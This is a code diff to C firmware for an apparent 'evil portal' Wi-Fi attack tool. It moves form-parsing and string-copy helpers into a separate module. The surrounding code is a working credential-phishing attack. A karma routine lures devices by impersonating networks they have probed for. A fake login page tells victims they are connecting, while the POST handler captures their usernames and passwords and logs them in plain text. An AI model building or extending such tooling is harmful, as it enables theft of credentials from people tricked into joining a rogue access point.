@@ -21,6 +21,7 @@
 #include "lwip/sockets.h"
 
 #include "lxveos_arm.h"
+#include "lxveos_formenc.h"
 #include "lxveos_wifi.h"
 
 static const char *TAG = "lxveos_evilportal";
@@ -105,76 +106,6 @@ static const char DONE_HTML[] =
     "<body style=\"font-family:sans-serif;max-width:360px;margin:40px auto\">"
     "<h2>Connecting&hellip;</h2><p>Please wait while your connection is established.</p></body></html>";
 
-// Decode application/x-www-form-urlencoded text ('+' -> space, %XX -> byte) into a bounded, NUL-terminated
-// destination.
-static void url_decode(const char *src, char *dst, size_t dstsz)
-{
-    size_t di = 0;
-    for (size_t si = 0; src[si] && di + 1 < dstsz; si++) {
-        char c = src[si];
-        if (c == '+') {
-            dst[di++] = ' ';
-        } else if (c == '%' && isxdigit((unsigned char)src[si + 1]) && isxdigit((unsigned char)src[si + 2])) {
-            char h[3] = {src[si + 1], src[si + 2], '\0'};
-            dst[di++] = (char)strtol(h, NULL, 16);
-            si += 2;
-        } else {
-            dst[di++] = c;
-        }
-    }
-    dst[di] = '\0';
-}
-
-// Extract form field `key` from a urlencoded `body` into `out` (URL-decoded, bounded). Returns false if the
-// key is not present.
-static bool form_field(const char *body, const char *key, char *out, size_t outsz)
-{
-    size_t klen = strlen(key);
-    for (const char *p = body; p && *p;) {
-        const char *amp = strchr(p, '&');
-        if (strncmp(p, key, klen) == 0 && p[klen] == '=') {
-            const char *val = p + klen + 1;
-            size_t vlen = amp ? (size_t)(amp - val) : strlen(val);
-            char raw[160];
-            if (vlen >= sizeof(raw)) {
-                vlen = sizeof(raw) - 1;
-            }
-            memcpy(raw, val, vlen);
-            raw[vlen] = '\0';
-            url_decode(raw, out, outsz);
-            return true;
-        }
-        if (!amp) {
-            break;
-        }
-        p = amp + 1;
-    }
-    return false;
-}
-
-// Replace control bytes so a crafted submission can't garble the console log.
-static void sanitize(char *s)
-{
-    for (; *s; s++) {
-        unsigned char c = (unsigned char)*s;
-        if (c < 0x20 || c == 0x7f) {
-            *s = '.';
-        }
-    }
-}
-
-// Bounded copy of a NUL-terminated string into dst (never overflows, always NUL-terminates). Manual rather
-// than snprintf("%s") because ESP-IDF's -Werror build treats the %s -Wformat-truncation note as fatal.
-static void store_field(char *dst, size_t dstsz, const char *src)
-{
-    size_t n = strlen(src);
-    if (n >= dstsz) {
-        n = dstsz - 1;
-    }
-    memcpy(dst, src, n);
-    dst[n] = '\0';
-}
-
 void lxveos_evilportal_creds_each(lxveos_evilportal_cred_cb cb)
 {
     if (cb == NULL) {
@@ -239,7 +170,7 @@ esp_err_t lxveos_evilportal_start_karma(char *chosen, size_t chosen_sz)
         return ESP_ERR_NOT_FOUND;  // no directed probe requests seen — nothing to lure with
     }
     if (chosen != NULL && chosen_sz > 0) {
-        store_field(chosen, chosen_sz, best);
+        lxveos_formenc_store_field(chosen, chosen_sz, best);
     }
     return lxveos_evilportal_start(best);
 }
@@ -343,14 +274,14 @@ static esp_err_t login_post_handler(httpd_req_t *req)
 
     char user[160] = {0};
     char pass[160] = {0};
-    form_field(body, "username", user, sizeof(user));
-    form_field(body, "password", pass, sizeof(pass));
-    sanitize(user);
-    sanitize(pass);
+    lxveos_formenc_form_field(body, "username", user, sizeof(user));
+    lxveos_formenc_form_field(body, "password", pass, sizeof(pass));
+    lxveos_formenc_sanitize(user);
+    lxveos_formenc_sanitize(pass);
     s_captures++;
     size_t slot = (s_captures - 1) % EP_MAX_CREDS;
-    store_field(s_creds[slot].user, sizeof(s_creds[slot].user), user);
-    store_field(s_creds[slot].pass, sizeof(s_creds[slot].pass), pass);
+    lxveos_formenc_store_field(s_creds[slot].user, sizeof(s_creds[slot].user), user);
+    lxveos_formenc_store_field(s_creds[slot].pass, sizeof(s_creds[slot].pass), pass);
     ESP_LOGW(TAG, "captured credential #%u: user='%s' pass='%s'", (unsigned)s_captures, user, pass);
 
     httpd_resp_set_type(req, "text/html");
